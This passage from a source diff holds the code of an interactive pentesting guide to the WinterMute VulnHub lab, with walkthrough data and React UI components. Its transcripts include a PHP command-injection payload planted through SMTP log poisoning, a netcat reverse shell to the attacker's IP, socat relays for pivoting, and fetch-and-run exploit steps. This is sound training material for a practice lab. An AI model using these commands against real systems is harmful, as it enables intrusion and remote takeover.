+    heading: "ntopng \u2014 default creds",
+    transcript: [
+      { prompt: "browser \u2192", cmd: "http://<straylight_ip>:3000" },
+      { note: "Login: admin / admin. Flows tab reveals /freeside/ and /turing-bolo/ \u2014 paths a directory brute-force would likely miss." }
+    ]
+  }, {
+    heading: "Arbitrary file read",
+    transcript: [
+      { prompt: "kali:~$", cmd: "curl \"http://<straylight_ip>/turing-bolo/bolo.php?bolo=/var/log/mail\"" },
+      { output: "<contents of /var/log/mail returned>" },
+      { note: "bolo= is used directly as a filename, .log appended \u2014 classic unvalidated path parameter." }
+    ]
+  }, {
+    heading: "File-read \u2192 RCE via mail-log poisoning",
+    transcript: [
+      { prompt: "kali:~$", cmd: "telnet <straylight_ip> 25" },
+      { prompt: "smtp>", cmd: "MAIL FROM:<you@example.com>" },
+      { prompt: "smtp>", cmd: "RCPT TO:<?php echo system($_POST['cmd']); ?>" },
+      { note: "PHP now sits inside the mail log, waiting to be interpreted." },
+      { prompt: "kali:~$", cmd: "curl -X POST \"http://<straylight_ip>/turing-bolo/bolo.php?bolo=/var/log/mail\" --data \"cmd=id\"" },
+      { output: "uid=33(www-data) gid=33(www-data)" },
+      { note: "RCE confirmed. Log poisoning generalizes: any log that (a) accepts attacker text and (b) gets interpreted elsewhere is a candidate \u2014 mail, access, and FTP logs are the classic three." }
+    ]
+  }, {
+    heading: "Reverse shell, then stabilize",
+    transcript: [
+      { prompt: "kali:~$", cmd: "nc -lvnp 4444" },
+      { prompt: "trigger \u2192", cmd: "cmd=nc -e /bin/sh <kali_ip> 4444" },
+      { output: "connect to [kali_ip] from straylight ... shell caught" },
+      { prompt: "straylight$", cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
+      { note: "Ctrl+Z, then on Kali: stty raw -echo; fg \u2014 full tty, tab-complete, safe Ctrl+C." }
+    ]
+  }, {
+    heading: "Privesc \u2014 a stale SUID binary",
+    transcript: [
+      { prompt: "straylight$", cmd: "find / -perm -4000 2>/dev/null" },
+      { output: "...\n-rwsr-xr-x 1 root root  screen-4.5.0" },
+      { note: "A version number on a SUID binary is always worth checking." },
+      { prompt: "kali:~$", cmd: "searchsploit screen 4.5.0" },
+      { note: "Host the matching exploit (python3 -m http.server), wget + chmod +x + run on target \u2192 root on Straylight. Check /root/ once you land \u2014 a note hints at Neuromancer." }
+    ]
+  }]
+}, {
+  id: "pivot",
+  day: "Stage 2",
+  accent: "#1f5c7a",
+  title: "Pivoting to Neuromancer & Taking Root",
+  blurb: "The module this whole guide exists for: relay through Straylight to reach a machine Kali can never see directly, exploit it, and relocate your shell onto it.",
+  sections: [{
+    heading: "Discovering the second network",
+    transcript: [
+      { prompt: "straylight#", cmd: "ifconfig" },
+      { output: "eth1: inet 192.168.57.4" },
+      { note: "A second NIC \u2014 Network #2. Invisible from Kali, visible from here." },
+      { prompt: "straylight#", cmd: "for i in {1..254}; do (ping -c1 192.168.57.$i | grep \"bytes from\" &); done" },
+      { prompt: "straylight#", cmd: "for p in $(seq 1 65535); do (nc -nvzw1 <neuromancer_ip> $p 2>&1 | grep open &); done" },
+      { note: "nmap likely isn't installed here \u2014 netcat loops fill in. Expect a web port, another service, and SSH on a high port." }
+    ]
+  }, {
+    heading: "Building the pivot: a port-forwarding relay",
+    transcript: [
+      { prompt: "straylight#", cmd: "socat TCP-LISTEN:8080,fork,reuseaddr TCP:<neuromancer_ip>:8080 &" },
+      { prompt: "straylight#", cmd: "socat TCP-LISTEN:8009,fork,reuseaddr TCP:<neuromancer_ip>:8009 &" },
+      { note: "straylight:8080 now silently forwards to neuromancer:8080. Nothing about the traffic changed \u2014 only where it's addressed." }
+    ],
+    diagram: true
+  }, {
+    heading: "Same job, tunneled instead of forwarded",
+    body: "socat needs installing and running on the pivot host, and encrypts nothing. SSH's own local forwarding does the identical job with nothing but a valid login.",
+    table: {
+      headers: ["", "socat (used above)", "SSH local forward (-L)"],
+      rows: [
+        ["Encrypts?", "No", "Yes"],
+        ["Needs on pivot host", "socat + a shell to run it from", "Just a valid login"],
+        ["Command", "socat TCP-LISTEN:8080,fork,reuseaddr TCP:neuro_ip:8080 &", "ssh -L 8080:neuro_ip:8080 user@straylight_ip"]
+      ]
+    }
+  }, {
+    heading: "Exploiting Neuromancer's web app through the relay",
+    transcript: [
+      { prompt: "straylight#", cmd: "socat TCP-LISTEN:4321,fork,reuseaddr TCP:<kali_ip>:4321 &" },
+      { note: "Bridges the callback \u2014 Neuromancer's shell needs to reach an address IT can see: Straylight's internal IP, not Kali's." },
+      { prompt: "kali:~$", cmd: "<trigger the Struts2 exploit against straylight:8080, callback \u2192 straylight_internal_ip:4321>" },
+      { note: "Double pivot: one relay carries the exploit in, a second carries the shell back out. Once it lands, your foothold has genuinely relocated \u2014 exploitation-based lateral movement (T1210), not credential-based (T1021)." }
+    ]
+  }, {
+    heading: "Root on Neuromancer",
+    transcript: [
+      { prompt: "neuromancer$", cmd: "uname -a" },
+      { note: "No compiler on target \u2014 compile locally instead:" },
+      { prompt: "kali:~$", cmd: "gcc -o exploit exploit.c && python3 -m http.server 4321" },
+      { prompt: "neuromancer$", cmd: "wget http://<relay_ip>:4321/exploit && chmod +x exploit && ./exploit" },
+      { output: "uid=0(root) gid=0(root)" },
+      { note: "Root on Neuromancer. Bonus: its Tomcat config has a password that's encoded, not encrypted \u2014 obfuscation isn't security." }
+    ]
+  }]
+}, {
+  id: "wrapup",
+  day: "Wrap-up",
+  accent: "#3d6ea5",
+  title: "What You Just Practiced",
+  blurb: "The full loop, one more time \u2014 and where to go next.",
+  sections: [{
+    heading: "The pattern that just repeated",
+    body: "Enumerate \u2192 exploit \u2192 escalate \u2192 discover a second network \u2192 relay through your foothold \u2192 exploit and escalate again. A public-facing system trusted by an internal one that isn't directly reachable is one of the most common findings in real internal pentests."
+  }, {
+    heading: "Checking the four concepts landed",
+    keyPoints: [
+      "Port forwarding \u2014 the socat relays moving raw traffic Straylight \u2192 Neuromancer.",
+      "Tunneling \u2014 the SSH -L equivalent, encrypted, using nothing but a login.",
+      "Pivoting \u2014 treating Straylight as the only route to a network you couldn't otherwise reach.",
+      "Lateral movement \u2014 exploiting Neuromancer through the relay, genuinely relocating your shell (T1210, not T1021)."
+    ]
+  }, {
+    heading: "Next steps",
+    body: "Redo the lab without this guide \u2014 the second pass is where it sticks. For something harder, myHouse7 on VulnHub is a multi-subnet variant of the same idea."
+  }, {
+    heading: "Credits",
+    body: "WinterMute was created by creosote, released on VulnHub 5 July 2018, Intermediate difficulty, no buffer-overflow knowledge required \u2014 explicitly OSCP-style pivoting practice. All credit for the lab goes to its original author."
+  }]
+}, {
+  id: "reference",
+  day: "Reference",
+  accent: "#5c6c7c",
+  title: "Port Forwarding & Tunneling Cheat Sheet",
+  blurb: "Click any command above \u2014 or below \u2014 to see what it does. Plus the SSH forwarding modes WinterMute didn't happen to need.",
+  isReference: true,
+  sections: [{
+    heading: "The three SSH forwarding modes",
+    table: {
+      headers: ["Flag", "Name", "Direction", "Example"],
+      rows: [
+        ["-L", "Local forward", "Your machine \u2192 a destination reachable from the far end", "ssh -L 8080:neuro_ip:80 user@straylight"],
+        ["-R", "Remote forward", "Far end \u2192 back to something on your machine", "ssh -R 4444:127.0.0.1:4444 user@straylight"],
+        ["-D", "Dynamic forward", "Whole connection becomes a SOCKS proxy", "ssh -D 1080 user@straylight"]
+      ]
+    },
+    tip: "-R is for when the target can reach your pivot host but you can't add a new inbound listener on it \u2014 the same problem the callback relay in Stage 2 solved by hand."
+  }]
+}];
+
+/* ============================================================
+   SHARED COMPONENTS
+   ============================================================ */
+
+const STORAGE_KEY = "pivoting-lab-progress-v3";
+function loadProgress() {
+  try { const raw = localStorage.getItem(STORAGE_KEY); return raw ? JSON.parse(raw) : {}; }
+  catch (e) { return {}; }
+}
+function saveProgress(obj) {
+  try { localStorage.setItem(STORAGE_KEY, JSON.stringify(obj)); } catch (e) {}
+}
+
+const GlossaryContext = React.createContext(null);
+function useGlossary() { return React.useContext(GlossaryContext); }
+
+function GlossaryPopover({ term, position, onClose }) {
+  const ref = useRef(null);
+  useEffect(() => {
+    const onDocClick = e => { if (ref.current && !ref.current.contains(e.target)) onClose(); };
+    const onEsc = e => { if (e.key === "Escape") onClose(); };
+    document.addEventListener("mousedown", onDocClick);
+    document.addEventListener("keydown", onEsc);
+    return () => { document.removeEventListener("mousedown", onDocClick); document.removeEventListener("keydown", onEsc); };
+  }, [onClose]);
+  if (!term) return null;
+  const entry = glossary[term];
+  if (!entry) return null;
+  const style = { position: "fixed", left: Math.min(position.x, window.innerWidth - 320), top: position.y };
+  return h("div", { className: "glossary-popover", style, ref },
+    h("div", { className: "glossary-popover-header" }, h("code", null, term), h("span", { className: "glossary-cat" }, entry.category)),
+    h("p", { className: "glossary-short" }, entry.short),
+    h("p", { className: "glossary-long" }, entry.long),
+    h("a", { href: "#reference", className: "glossary-more", onClick: e => { e.preventDefault(); onClose(); window.__gotoReference && window.__gotoReference(); } }, "See full reference \u2192")
+  );
+}
+
+function GlossaryProvider({ children }) {
+  const [active, setActive] = useState(null);
+  const open = (term, e) => { const rect = e.target.getBoundingClientRect(); setActive({ term, position: { x: rect.left, y: rect.bottom + 8 } }); };
+  const close = () => setActive(null);
+  return h(GlossaryContext.Provider, { value: { open, close, active } }, children, active && h(GlossaryPopover, { term: active.term, position: active.position, onClose: close }));
+}
+
+function tokenizeLine(line, onTermClick) {
+  const words = line.split(/(\s+|\||,)/);
+  return words.map((w, i) => {
+    const clean = w.trim();
+    if (glossary[clean]) return h("span", { key: i, className: "code-term", onClick: e => { e.stopPropagation(); onTermClick(clean, e); } }, w);
+    return w;
+  });
+}
+
+function Transcript({ lines }) {
+  const gloss = useGlossary();
+  const [copied, setCopied] = useState(false);
+  const cmds = lines.filter(l => l.cmd).map(l => l.cmd).join("\n");
+  return h("div", { className: "transcript" },
+    h("button", { className: "transcript-copy", onClick: () => { navigator.clipboard.writeText(cmds); setCopied(true); setTimeout(() => setCopied(false), 1400); } }, copied ? "Copied" : "Copy"),
+    lines.map((l, i) => {
+      if (l.note) return h("div", { className: "transcript-note", key: i }, h("span", { className: "transcript-note-arrow" }, "\u25B8"), h("span", null, l.note));
+      if (l.output) return h("div", { className: "transcript-output", key: i }, l.output);
+      return h("div", { className: "transcript-line", key: i }, l.prompt && h("span", { className: "transcript-prompt" }, l.prompt), tokenizeLine(l.cmd, gloss.open));
+    })
+  );
+}
+
+function CodeBlock({ code }) {
+  const [copied, setCopied] = useState(false);
+  const gloss = useGlossary();
+  const lines = code.split("\n");
+  return h("div", { className: "code-block" },
+    h("button", { className: "copy-btn", onClick: () => { navigator.clipboard.writeText(code); setCopied(true); setTimeout(() => setCopied(false), 1400); } }, copied ? "Copied" : "Copy"),
+    h("pre", null, lines.map((line, i) => h(React.Fragment, { key: i }, tokenizeLine(line, gloss.open), i < lines.length - 1 ? "\n" : null)))
+  );
+}
+
+function Exercise({ exercise }) {
+  return h("div", { className: "exercise" },
+    h("div", { className: "exercise-label" }, h("span", { className: "exercise-tag" }, "Try it"), exercise.label),
+    exercise.steps && h("ol", { className: "exercise-steps" }, exercise.steps.map((s, i) => h("li", { key: i }, s))),
+    exercise.code && h(CodeBlock, { code: exercise.code }),
+    exercise.body && h("p", { className: "exercise-body" }, exercise.body)
+  );
+}
+
+function Callout({ type, children }) {
+  const labels = { warning: "Watch out", tip: "Tip" };
+  return h("div", { className: "callout callout-" + type }, h("span", { className: "callout-label" }, labels[type]), h("span", null, children));
+}
+
+function DataTable({ table }) {
+  return h("div", { className: "table-wrap" },
+    h("table", null,
+      h("thead", null, h("tr", null, table.headers.map((th, i) => h("th", { key: i }, th)))),
+      h("tbody", null, table.rows.map((row, i) => h("tr", { key: i }, row.map((cell, j) => h("td", { key: j }, cell)))))
+    )
+  );
+}
+
+function Downloads({ items }) {
+  return h("div", { className: "downloads" }, items.map((d, i) => h("a", { key: i, href: d.url, className: "download-btn", target: "_blank", rel: "noopener noreferrer" }, "\u2193 " + d.label)));
+}
+
+function NetworkDiagram() {
+  return h("div", { className: "diagram-wrap" },
+    h("svg", { viewBox: "0 0 400 130", width: "100%", style: { maxWidth: "440px", display: "block", margin: "0 auto" } },
+      h("line", { x1: 40, y1: 14, x2: 360, y2: 14, stroke: "var(--warning-border)", strokeWidth: 1.3, strokeDasharray: "4,3" }),
+      h("text", { x: 200, y: 9, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 8.5, fill: "var(--warning-border)", fontWeight: 600 }, "no direct route"),
+      h("rect", { x: 4, y: 42, width: 70, height: 32, rx: 2, fill: "#fff", stroke: "var(--accent)", strokeWidth: 1.5 }),
+      h("text", { x: 39, y: 62, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 10, fontWeight: 700, fill: "var(--heading)" }, "KALI"),
+      h("rect", { x: 150, y: 28, width: 100, height: 60, rx: 2, fill: "#fff", stroke: "var(--accent-ink)", strokeWidth: 1.8 }),
+      h("text", { x: 200, y: 55, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 10, fontWeight: 700, fill: "var(--heading)" }, "STRAYLIGHT"),
+      h("text", { x: 200, y: 69, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 7.5, fill: "var(--muted)" }, "dual-homed pivot"),
+      h("rect", { x: 326, y: 42, width: 70, height: 32, rx: 2, fill: "#fff", stroke: "var(--muted-2)", strokeWidth: 1.5, strokeDasharray: "3,2" }),
+      h("text", { x: 361, y: 58, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 8.5, fontWeight: 700, fill: "var(--muted)" }, "NEURO-"),
+      h("text", { x: 361, y: 68, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 8.5, fontWeight: 700, fill: "var(--muted)" }, "MANCER"),
+      h("line", { x1: 74, y1: 58, x2: 150, y2: 58, stroke: "var(--accent)", strokeWidth: 1.6 }),
+      h("text", { x: 112, y: 50, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 7.5, fill: "var(--muted)" }, "NETWORK #1"),
+      h("line", { x1: 250, y1: 58, x2: 326, y2: 58, stroke: "var(--muted-2)", strokeWidth: 1.6, strokeDasharray: "4,3" }),
+      h("text", { x: 288, y: 50, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 7.5, fill: "var(--muted)" }, "NETWORK #2"),
+      h("text", { x: 288, y: 100, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 7.5, fill: "var(--muted-2)" }, "(pivot only)")
+    ),
+    h("p", { className: "diagram-caption" }, "Neuromancer only exists from Straylight's point of view \u2014 reaching it requires relaying through the pivot.")
+  );
+}
+
+function ContentSection({ section }) {
+  return h("div", { className: "content-section" },
+    h("h3", null, section.heading),
+    section.body && h("p", null, section.body),
+    section.diagram && h(NetworkDiagram, null),
+    section.transcript && h(Transcript, { lines: section.transcript }),
+    section.downloads && h(Downloads, { items: section.downloads }),
+    section.steps && !section.exercise && h("ol", { className: "plain-steps" }, section.steps.map((s, i) => h("li", { key: i }, s))),
+    section.table && h(DataTable, { table: section.table }),
+    section.keyPoints && h("ul", { className: "key-points" }, section.keyPoints.map((kp, i) => h("li", { key: i }, kp))),
+    section.warning && h(Callout, { type: "warning" }, section.warning),
+    section.exercise && h(Exercise, { exercise: section.exercise }),
+    section.tip && h(Callout, { type: "tip" }, section.tip)
+  );
+}
+
+function ReferenceList() {
+  return h("div", { className: "ref-list" }, glossaryOrder.map(term => {
+    const entry = glossary[term];
+    return h("div", { className: "ref-entry", id: "ref-" + term, key: term },
+      h("div", { className: "ref-entry-head" }, h("code", null, term), h("span", { className: "ref-cat" }, entry.category)),
+      h("p", { className: "ref-short" }, entry.short),
+      h("p", { className: "ref-long" }, entry.long)
+    );
+  }));
+}
+
+function ProgressToggle({ moduleId, done, onToggle }) {
+  return h("button", { className: "progress-toggle" + (done ? " done" : ""), onClick: () => onToggle(moduleId) },
+    h("span", { className: "progress-check" }, done ? "\u2713" : ""), done ? "Marked complete" : "Mark this sheet complete"
+  );
+}
+
+function BrandBanner() {
+  return h("a", { className: "brand-banner", href: "https://sarathg.me", target: "_blank", rel: "noopener noreferrer" },
+    h("div", { className: "brand-banner-text" }, h("strong", null, "Want more guides like this?"), h("span", null, " Visit sarathg.me for OSINT, Splunk, and security learning resources.")),
+    h("span", { className: "brand-banner-arrow" }, "\u2192")
+  );
+}
+
+/* ============================================================
+   CONCEPTS VIEW
+   ============================================================ */
+
+const VB = {
+  forward: { w: 560, h: 170 },
+  tunnel: { w: 560, h: 200 },
+  combo: { w: 620, h: 170 },
+  pivot: { w: 660, h: 260 },
+  lateral: { w: 640, h: 260 }
+};
+
+const POS = {
+  forward: { remote: { x: 9.11, y: 50.59 }, router: { x: 51.79, y: 50 }, server: { x: 90.36, y: 50.59 } },
+  tunnel: { remote: { x: 9.11, y: 53 }, sshserver: { x: 51.79, y: 47 }, sshclient: { x: 90.36, y: 53 } },
+  combo: { attacker: { x: 8.23, y: 50.59 }, jump: { x: 50, y: 50 }, deep: { x: 88.71, y: 50.59 } },
+  lateral: { attacker: { x: 6.41, y: 50 }, initial: { x: 34.38, y: 48.46 }, peerc: { x: 62.5, y: 66.15 }, dc: { x: 89.38, y: 66.92 } }
+};
+
+const SEQUENCES = {
+  forward: { loop: true, steps: 3, phases: [
+    { pos: "remote", badge: "\u2192 router:8080", caption: "Packet leaves your PC, addressed to the router's public port 8080.", opacity: 1, hold: 2000, step: 1 },
+    { pos: "router", badge: "\u2192 10.0.0.50:80", caption: "The router rewrites the destination and relays it inward \u2014 that's the \u201cforward\u201d in port forwarding.", opacity: 1, hold: 2600, step: 2 },
+    { pos: "server", badge: "DELIVERED", caption: "Arrives at the internal server on port 80, in plain text \u2014 no encryption anywhere on this path.", opacity: 1, hold: 2600, step: 3 },
+    { pos: "server", badge: "", caption: "", opacity: 0, hold: 400 },
+    { pos: "remote", badge: "", caption: "", opacity: 0, hold: 600 }
+  ] },
+  tunnel: { loop: true, steps: 3, phases: [
+    { pos: "remote", badge: "SSH", caption: "SSH encrypts the connection before it ever leaves your PC.", opacity: 1, hold: 2000, step: 1, encrypted: true },
+    { pos: "sshserver", badge: "UNWRAPPED", caption: "The SSH server terminates the encryption here \u2014 it's the only machine that can reach the local network directly.", opacity: 1, hold: 2600, step: 2 },
+    { pos: "sshclient", badge: "PLAINTEXT", caption: "From the SSH server onward it's naked again \u2014 tunneling only protected the first hop.", opacity: 1, hold: 2600, step: 3 },
+    { pos: "sshclient", badge: "", caption: "", opacity: 0, hold: 400 },
+    { pos: "remote", badge: "", caption: "", opacity: 0, hold: 600 }
+  ] },
+  combo: { loop: true, steps: 3, phases: [
+    { pos: "attacker", badge: "SSH -L", caption: "An SSH tunnel carries the packet to the jump server, encrypted.", opacity: 1, hold: 2000, step: 1, encrypted: true },
+    { pos: "jump", badge: "socat", caption: "SSH alone can't reach any further \u2014 a plain socat relay chains on from here.", opacity: 1, hold: 2800, step: 2 },
+    { pos: "deep", badge: "REACHED", caption: "The deep server is now reachable \u2014 neither tool alone could get here in a single hop.", opacity: 1, hold: 2600, step: 3 },
+    { pos: "deep", badge: "", caption: "", opacity: 0, hold: 400 },
+    { pos: "attacker", badge: "", caption: "", opacity: 0, hold: 600 }
+  ] },
+  lateral: { loop: false, steps: 4, phases: [
+    { pos: "attacker", badge: "\u003E_", caption: "Your foothold starts on Kali.", opacity: 1, hold: 2000, step: 1, homeVisible: true },
+    { pos: "initial", badge: "\u003E_", caption: "Relayed onto the initial compromised server \u2014 but the shell doesn't stay here either.", opacity: 1, hold: 2200, step: 2, homeVisible: true },
+    { pos: "peerc", badge: "\u003E_", caption: "On to the app server \u2014 one of several reachable peers. (The file server above was reachable too, just not used this path.)", opacity: 1, hold: 2400, step: 3, homeVisible: true },
+    { pos: "dc", badge: "\u003E_", caption: "Landed on the Domain Controller. Your shell has actually relocated \u2014 DC is now compromised, and Kali is no longer \u201chome.\u201d", opacity: 1, hold: Infinity, step: 4, landed: true }
+  ] },
+  pivot: { loop: false, steps: 4, phases: [
+    { reveal: [], caption: "Kali reaches Pivot A through the firewall \u2014 nothing beyond it is visible yet.", hold: 1700, step: 1 },
+    { reveal: ["hop1"], caption: "HOP 1 \u2014 Pivot A is compromised. A relay is set up toward Pivot B.", hold: 2400, step: 2 },
+    { reveal: ["hop1", "hop2"], caption: "HOP 2 \u2014 Pivot B is compromised via the relay through Pivot A.", hold: 2400, step: 3 },
+    { reveal: ["hop1", "hop2", "segment"], caption: "Entire internal segment now reachable \u2014 including a backdoored web server and an unpatched domain controller \u2014 all through a chain of two relays.", hold: Infinity, step: 4 }
+  ] }
+};
+
+function useModeSequence(modeId) {
+  const config = SEQUENCES[modeId];
+  const [idx, setIdx] = useState(0);
+  useEffect(() => { setIdx(0); }, [modeId]);
+  useEffect(() => {
+    const phase = config.phases[idx];
+    if (!phase) return;
+    const isLast = idx === config.phases.length - 1;
+    if (isLast && !config.loop) return;
+    if (phase.hold === Infinity) return;
+    const t = setTimeout(() => setIdx(p => (p + 1) % config.phases.length), phase.hold);
+    return () => clearTimeout(t);
+  }, [idx, modeId]);
+  return { idx, phase: config.phases[idx], config, restart: () => setIdx(0) };
+}
+
+function ConceptLegend() {
+  return h("div", { className: "concept-legend" },
+    h("div", { className: "concept-legend-item" }, h("span", { className: "concept-legend-swatch" }), "active path"),
+    h("div", { className: "concept-legend-item" }, h("span", { className: "concept-legend-swatch dashed" }), "unused this mode"),
+    h("div", { className: "concept-legend-item" }, h("span", { className: "concept-legend-chip plain" }), "plaintext"),
+    h("div", { className: "concept-legend-item" }, h("span", { className: "concept-legend-chip encrypted" }), "encrypted"),
+    h("div", { className: "concept-legend-item" }, h("span", { className: "concept-legend-chip compromised" }), "compromised")
+  );
+}
+
+function svgNode(x, y, w, hh, label, sublabel, opts) {
+  opts = opts || {};
+  const dim = !!opts.dim, compromised = !!opts.compromised, dashed = !!opts.dashed;
+  const stroke = compromised ? "var(--highlight)" : dim ? "var(--muted-2)" : "var(--accent-ink)";
+  return h(React.Fragment, { key: "node-" + label },
+    h("rect", { x, y, width: w, height: hh, rx: 2, className: "concept-fade", fill: compromised ? "var(--warning-bg)" : "#fff", stroke, strokeWidth: dim ? 1.2 : 2, strokeDasharray: dashed ? "3,2" : undefined }),
+    h("text", { x: x + w / 2, y: y + hh * 0.42 + 5, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 8.5, fontWeight: 700, fill: compromised ? "var(--highlight)" : dim ? "var(--muted-2)" : "var(--heading)" }, label),
+    sublabel && h("text", { x: x + w / 2, y: y + hh * 0.78 + 3, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 6, fill: "var(--muted)" }, sublabel),
+    compromised && h("text", { x: x + w / 2, y: y + hh + 11, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 6.5, fontWeight: 700, fill: "var(--highlight)" }, "COMPROMISED")
+  );
+}
+function svgEdge(x1, y1, x2, y2, opts) {
+  opts = opts || {};
+  return h("line", { key: "edge-" + x1 + "-" + y1 + "-" + x2 + "-" + y2, x1, y1, x2, y2, className: "concept-fade", stroke: opts.dim ? "var(--rule-strong)" : "var(--accent-ink)", strokeWidth: opts.dim ? 1.2 : 2, strokeDasharray: opts.dashed ? "4,3" : undefined, opacity: opts.opacity !== undefined ? opts.opacity : 1 });
+}
+
+function ConceptDiagram({ modeId }) {
+  const { idx, phase, config, restart } = useModeSequence(modeId);
+  const isPivot = modeId === "pivot";
+  const isLateral = modeId === "lateral";
+  const isLastPhase = idx === config.phases.length - 1;
+  const showReplay = !config.loop && isLastPhase;
+  const dims = VB[modeId];
+
+  const reveal = isPivot ? phase.reveal || [] : [];
+  const showHop1 = reveal.includes("hop1");
+  const showHop2 = reveal.includes("hop2");
+  const showSegment = reveal.includes("segment");
+  const dcCompromised = isLateral && phase.landed;
+  const pastInitial = isLateral && idx >= 1;
+  const pastPeerC = isLateral && idx >= 2;
+
+  const markerPos = phase.pos ? POS[modeId][phase.pos] : null;
+
+  let svgContent, blockedRouteText = "";
+
+  if (modeId === "forward") {
+    svgContent = [
+      svgEdge(94, 86, 235, 85),
+      svgEdge(345, 85, 460, 86),
+      svgNode(8, 65, 86, 42, "REMOTE PC", "your machine"),
+      svgNode(235, 50, 110, 70, "ROUTER", "fwd :8080\u2192.50:80"),
+      svgNode(460, 65, 92, 42, "SERVER", "10.0.0.50")
+    ];
+  } else if (modeId === "tunnel") {
+    blockedRouteText = "\u2715 [ DIRECT ACCESS BLOCKED \u2014 MUST TUNNEL THROUGH THE SSH SERVER ]";
+    svgContent = [
+      h("rect", { key: "lan", x: 205, y: 8, width: 350, height: 184, rx: 6, fill: "none", stroke: "var(--rule-strong)", strokeWidth: 1.2, strokeDasharray: "3,3" }),
+      h("text", { key: "lanlabel", x: 540, y: 22, textAnchor: "end", fontFamily: "JetBrains Mono, monospace", fontSize: 7, fontWeight: 700, fill: "var(--muted)" }, "LOCAL NETWORK"),
+      h("line", { key: "blocked", x1: 51, y1: 30, x2: 506, y2: 30, stroke: "var(--warning-border)", strokeWidth: 1.3, strokeDasharray: "4,3" }),
+      h("text", { key: "blockedlabel", x: 278, y: 20, textAnchor: "middle", fontFamily: "JetBrains Mono, monospace", fontSize: 7.5, fontWeight: 600, fill: "var(--warning-border)" }, "\u2715 direct connection refused"),
+      svgEdge(94, 100, 235, 90),
+      svgEdge(345, 90, 460, 100),
+      svgNode(8, 85, 86, 42, "REMOTE PC", "192.168.1.x"),
+      svgNode(235, 55, 110, 78, "SSH SERVER", "dual-homed"),
+      svgNode(460, 85, 92, 42, "SSH CLIENT", "192.168.10.2")
+    ];
+  } else if (modeId === "combo") {
+    svgContent = [
+      svgEdge(94, 86, 255, 85),
+      svgEdge(365, 85, 500, 86),
+      svgNode(8, 65, 86, 42, "ATTACKER"),
+      svgNode(255, 50, 110, 70, "JUMP SERVER", "SSH endpoint"),
+      svgNode(500, 65, 100, 42, "DEEP SERVER", "via socat")
+    ];
+  } else if (modeId === "pivot") {
+    blockedRouteText = "\u2715 [ NO DIRECT ROUTE FROM KALI TO THE INTERNAL SEGMENT ]";
+    const segY = { web: 8, db: 64, files: 120, dc: 176 };
+    const segLabel = { web: ["WEB", "(backdoored)"], db: ["DB", null], files: ["FILES", "(patched)"], dc: ["DC", "(unpatched)"] };
+    svgContent = [
+      svgEdge(76, 128, 98, 128),
+      svgEdge(154, 128, 190, 128),
+      svgEdge(280, 105, 350, 60, { dim: !showHop1, opacity: showHop1 ? 1 : 0.22 }),
+      ...["web", "db", "files", "dc"].map(k => svgEdge(434, 46, 470, segY[k] + 19, { dim: !showSegment, opacity: showSegment ? 1 : 0 })),
+      svgNode(6, 108, 70, 40, "KALI"),
+      svgNode(98, 98, 56, 60, "FIREWALL"),
+      showHop1 && h("rect", { key: "pulseA", x: 186, y: 91, width: 108, height: 74, rx: 6, fill: "none", stroke: "var(--accent-ink)", strokeWidth: 2, className: "pivot-pulse" }),
+      svgNode(190, 95, 100, 66, "PIVOT A", "10.129.x.x \u2192 172.16.5.x"),
+      showHop2 && h("rect", { key: "pulseB", x: 336, y: 16, width: 102, height: 60, rx: 6, fill: "none", stroke: "var(--accent-ink)", strokeWidth: 2, className: "pivot-pulse" }),
+      svgNode(340, 20, 94, 52, "PIVOT B", "internal relay", { dim: !showHop2 }),
+      ...["web", "db", "files", "dc"].map(k => svgNode(470, segY[k], 110, 38, segLabel[k][0], segLabel[k][1], { dim: !showSegment }))
+    ];
+  } else if (modeId === "lateral") {
+    svgContent = [
+      svgEdge(76, 130, 170, 126),
+      svgEdge(270, 110, 350, 36, { dim: true, dashed: true, opacity: 0.4 }),
+      svgEdge(270, 140, 350, 172, { dim: !pastInitial, opacity: pastInitial ? 1 : 0.3 }),
+      svgEdge(450, 172, 520, 174, { dim: !pastPeerC, opacity: pastPeerC ? 1 : 0.3 }),
+      svgNode(6, 110, 70, 40, "KALI"),
+      svgNode(170, 98, 100, 56, "INITIAL SVR", "via phishing", { dim: !pastInitial }),
+      svgNode(350, 14, 100, 44, "FILE SVR", "not used this path", { dim: true }),
+      svgNode(350, 150, 100, 44, "APP SVR", null, { dim: !pastPeerC }),
+      svgNode(520, 150, 104, 48, "DC", "domain controller", { dim: !dcCompromised, compromised: dcCompromised })
+    ];
+  }
+
+  return h("div", { className: "concept-diagram" },
+    blockedRouteText && h("div", { className: "blocked-route" + ((isPivot || modeId === "tunnel") ? " show" : "") }, blockedRouteText),
+    h("div", { className: "concept-tag-top-wrap" }, h("span", { className: "concept-tag-top" }, modes.find(m => m.id === modeId).tag)),
+    h("div", { className: "concept-stage", style: { aspectRatio: dims.w + " / " + dims.h } },
+      h("svg", { viewBox: "0 0 " + dims.w + " " + dims.h, className: "concept-stage-svg" }, svgContent),
+      h("div", { className: "concept-overlay" },
+        isLateral && h("div", {
+          className: "concept-marker concept-home-marker",
+          style: { left: POS.lateral.attacker.x + "%", top: (POS.lateral.attacker.y - 18) + "%", opacity: phase.homeVisible ? 1 : 0 }
+        }, "YOU WERE HERE"),
+        markerPos && h("div", {
+          className: "concept-marker concept-badge" + (phase.encrypted ? " encrypted-style" : "") + (isLateral ? " lateral-style" : ""),
+          style: { left: markerPos.x + "%", top: markerPos.y + "%", opacity: phase.opacity, transform: "translate(-50%, -50%)" + (phase.landed ? " scale(1.15)" : "") }
+        }, phase.badge)
+      )
+    ),
+    h("div", { className: "concept-caption-bar" },
+      h("div", { className: "concept-step-label" }, phase.step ? "STEP " + phase.step + " / " + config.steps : "\u00A0"),
+      h("div", { className: "concept-caption-text" }, phase.caption || "\u00A0")
+    ),
